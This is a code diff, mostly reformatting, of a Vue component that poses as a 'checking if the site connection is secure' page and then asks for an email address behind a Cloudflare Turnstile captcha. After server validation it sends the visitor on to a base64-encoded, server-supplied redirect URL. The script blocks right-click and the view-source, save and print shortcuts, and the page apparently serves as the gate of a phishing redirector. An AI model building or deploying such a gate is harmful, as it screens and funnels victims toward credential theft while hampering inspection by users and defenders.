@@ -3,38 +3,61 @@
     <main>
       <div class="instructions">
         <p>Please stand by while we are checking if the site connection is secure.</p>
-        <div
-          class="cf-turnstile"
-          data-sitekey="0x4AAAAAABgei6QZruCN7n08"
-        ></div>
+        <div class="cf-turnstile" data-sitekey="0x4AAAAAABgei6QZruCN7n08"></div>
       </div>
     </main>
   </div>
 
   <div v-else class="background">
     <div class="toto-container">
-        <div class="header">
-          <div class="logo-text">
-            <span class="success-check">⼈</span>
-          </div>
+      <div class="header">
+        <div class="logo-text">
+          <span class="success-check">⼈</span>
         </div>
-        <div class="content">
-          <p><strong>Please confirm your email address to continue.</strong></p>
-          <div class="form-wrapper">
-            <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
-            <input id="honeypot" v-model="honeypot" type="text" style="display: none;" tabindex="-1" autocomplete="off" aria-hidden="true" />
-            <label for="email" class="visually-hidden">Email address</label>
-            <input id="email" v-model="email" type="email" placeholder="Enter your email" required class="email-input" :disabled="loading" />
-            <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>
-            <button @click="submitForm" :disabled="loading" class="action-button">
-              {{ loading ? 'Submitting…' : 'Submit' }}
-            </button>
-          </div>
+      </div>
+
+      <div class="content">
+        <p><strong>Please confirm your email address to continue.</strong></p>
+
+        <div class="form-wrapper">
+          <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
+          <input
+            id="honeypot"
+            v-model="honeypot"
+            type="text"
+            tabindex="-1"
+            autocomplete="off"
+            aria-hidden="true"
+            class="visually-hidden"
+          />
+
+          <label for="email" class="visually-hidden">Email address</label>
+          <input
+            id="email"
+            v-model="email"
+            type="email"
+            placeholder="Enter your email"
+            required
+            class="email-input"
+            :disabled="loading"
+          />
+
+          <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>
+
+          <button @click="submitForm" :disabled="loading" class="action-button">
+            {{ loading ? 'Submitting…' : 'Submit' }}
+          </button>
         </div>
-        <div class="divider"></div>
-        <div class="footer-container">
-          <p class="footer-text">© 2025 All rights reserved. <a href="/privacy" target="_blank">Privacy Policy</a> | <a href="/terms" target="_blank">Terms</a></p>
-        </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <div class="footer-container">
+        <p class="footer-text">
+          © 2025 All rights reserved.
+          <a href="/privacy" target="_blank">Privacy Policy</a> |
+          <a href="/terms" target="_blank">Terms</a>
+        </p>
       </div>
     </div>
   </div>
@@ -42,6 +65,7 @@
 
 <script setup>
 import { ref, onMounted, nextTick } from 'vue'
+
 const email = ref('')
 const honeypot = ref('')
 const error = ref('')
@@ -50,18 +74,22 @@ const captchaToken = ref(null)
 
 onMounted(async () => {
   await nextTick()
+
+  // Disable right-click and developer shortcuts
   document.addEventListener('contextmenu', e => e.preventDefault())
   document.addEventListener('keydown', e => {
-    if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'p' || e.key === 'Shift')) {
+    if (e.ctrlKey && ['u', 's', 'p', 'Shift'].includes(e.key)) {
       e.preventDefault()
     }
   })
+
+  // Render Cloudflare Turnstile
   if (window.turnstile) {
     window.turnstile.render('.cf-turnstile', {
       sitekey: '0x4AAAAAABgei6QZruCN7n08',
-      callback: (token) => {
+      callback: token => {
         captchaToken.value = token
-      }
+      },
     })
   }
 })
@@ -85,6 +113,7 @@ async function submitForm() {
     if (!res.ok || !data.valid) {
       throw new Error(data.message || 'Verification failed')
     }
+
     if (data.redirectUrl) {
       const encoded = btoa(data.redirectUrl)
       window.location.href = `${import.meta.env.VITE_API_BASE}/forward?data=${encoded}`
@@ -97,20 +126,17 @@ async function submitForm() {
 }
 </script>
 
-
-
-
-
-
 <style scoped>
 .visually-hidden {
   position: absolute !important;
-  height: 1px; width: 1px;
+  height: 1px;
+  width: 1px;
   overflow: hidden;
   clip: rect(1px, 1px, 1px, 1px);
   white-space: nowrap;
 }
-  html, body {
+
+html, body {
   height: 100vh;
   margin: 0;
   padding: 0;
@@ -124,7 +150,6 @@ body {
   display: block;
 }
 
-/* Shared container layout */
 .background,
 .gate-container {
   position: fixed;
@@ -137,12 +162,9 @@ body {
   justify-content: flex-start;
   align-items: center;
   padding-top: 100px;
-  box-sizing: border-box;
-  overflow: hidden;
   background-color: #FAF9F6;
 }
 
-/* CAPTCHA scaling */
 .cf-turnstile {
   transform: scale(0.9);
   transform-origin: center;
@@ -159,14 +181,13 @@ body {
 .toto-container {
   width: 100%;
   max-width: 600px;
-  background: #ffffff;
+  background: #fff;
   border-radius: 10px;
   box-shadow: 0 1px 20px rgba(0, 0, 0, 0.1);
   padding: 4rem;
   display: flex;
   flex-direction: column;
   justify-content: center;
-  box-sizing: border-box;
   height: 50vh;
 }
 
@@ -242,8 +263,7 @@ body {
   text-align: center;
 }
 
-.footer-text,
-.global-footer {
+.footer-text {
   font-size: 0.85rem;
   color: #333;
   margin-top: 0.5rem;
@@ -255,44 +275,31 @@ body {
   margin-top: 0.6rem;
 }
 
-/* Dark mode overrides */
+/* Dark mode */
 @media (prefers-color-scheme: dark) {
-  html, body {
-    background-color: #121212;
-    color: #ffffff;
-  }
-
+  html, body,
   .background,
   .gate-container {
     background-color: #121212;
     color: #ffffff;
   }
 
-  .instructions p,
-  .instructions h,
-  .instructions {
+  .instructions,
+  .toto-container {
     color: #ffffff;
   }
 
   .toto-container {
     background: #1e1e1e;
-    color: #ffffff;
     box-shadow: 0 1px 20px rgba(255, 255, 255, 0.05);
   }
 
   .email-input {
     background-color: #2b2b2b;
-    color: #ffffff;
     border-color: #444;
   }
 
-  .action-button {
-    color: #0078D4;
-    border-color: #0078D4;
-  }
-
-  .footer-text,
-  .global-footer {
+  .footer-text {
     color: #aaaaaa;
   }
 
